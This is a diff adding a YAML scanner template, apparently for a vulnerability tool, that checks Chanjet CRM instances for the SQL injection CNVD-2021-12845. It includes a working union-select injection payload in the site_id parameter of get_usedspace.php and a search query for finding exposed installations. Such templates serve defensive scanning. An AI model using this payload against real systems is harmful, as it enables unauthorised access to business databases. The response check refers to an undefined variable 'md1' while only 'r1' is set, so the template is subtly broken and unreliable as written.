@@ -1,0 +1,22 @@
+name: Chanjet CRM get_usedspace.php sql injection CNVD-2021-12845
+manual: true
+query: title="畅捷CRM"
+transport: http
+set:
+  r1: randomInt(400000, 448000)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{r1}}))
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"{{md1}}")
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-12845
+  description: Chanjet Information Technology Co., Ltd. is a company dedicated to
+    providing platform services, application services and data value-added services
+    centered on financial and management services for small and micro enterprises
+    in China.
+  tags: sqli
